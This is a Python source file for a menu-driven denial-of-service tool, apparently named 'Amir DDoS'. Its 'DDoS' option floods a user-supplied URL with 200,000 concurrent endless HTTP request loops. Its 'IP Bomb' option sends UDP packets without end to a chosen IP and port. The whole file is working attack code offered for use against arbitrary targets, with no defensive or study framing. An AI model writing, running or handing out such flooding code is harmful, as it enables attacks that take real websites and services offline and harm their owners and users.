import time

import aiohttp
import asyncio
import sys
import colorama 
from colorama import Fore
import os 
from pystyle import *
import socket
import time
import webbrowser

colorama.init(convert=True, autoreset=True)


packets = 0
fetches = 0
url = ""

def send_packet(ipa, port):
    global packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))

    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()
def ipbomb(ip, port):
    global packets
    os.system('cls') if os.name == 'nt' else os.system('clear')
    while True:
        send_packet(ip, port)
        packets += 1
        sys.stdout.write(f'Packets sent: {packets} | Ip: {ip}, Port: {port}')
        
async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f"Status: {response.status} | Requests: [{fetches}]\r")
        except Exception as e:
            sys.stdout.write(f"Error: {e}\r")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(200000)] 
        await asyncio.gather(*tasks)
        

def main_menu():
    global url

    os.system('cls') if os.name == 'nt' else os.system('clear')
    print(f"""

    {Fore.RED}░█████╗░███╗░░░███╗██╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
    {Fore.RED}██╔══██╗████╗░████║██║██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    {Fore.RED}███████║██╔████╔██║██║██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
    {Fore.RED}██╔══██║██║╚██╔╝██║██║██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
    {Fore.RED}██║░░██║██║░╚═╝░██║██║██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
    {Fore.RED}╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
    {Fore.RESET}                                                                                 

    """)
    print(f"{Fore.RED} [1] DDoS{Fore.RESET}")
    print(f"{Fore.RED} [2] IP Bomb{Fore.RESET}")
    print(f"{Fore.RED} [3] GITHUB{Fore.RESET}")
    print(f"{Fore.RED} [4] Exit{Fore.RESET}")
    choice = input('==> ')

    if choice not in ['1', '2', '3', '4']:
        print(f"{Fore.RED}Invalid choice. Please select either 1, 2, 3, or 4.{Fore.RESET}")
        time.sleep(1)
        main_menu()

    if int(choice) == 1:
        url = str(input('Target URL >> '))
        asyncio.run(main())

    elif int(choice) == 2:
        ip = str(input('Target IP >> '))
        port = int(input('Port >> '))
        ipbomb(ip, port)

    elif int(choice) == 3:
        webbrowser.open('https://github.com/AmirCyberSecurity')

    elif int(choice) == 4:
        print(f"{Fore.RED}Exiting...{Fore.RESET}")
        time.sleep(1)
        sys.exit()

if __name__ == "__main__":
    main_menu()


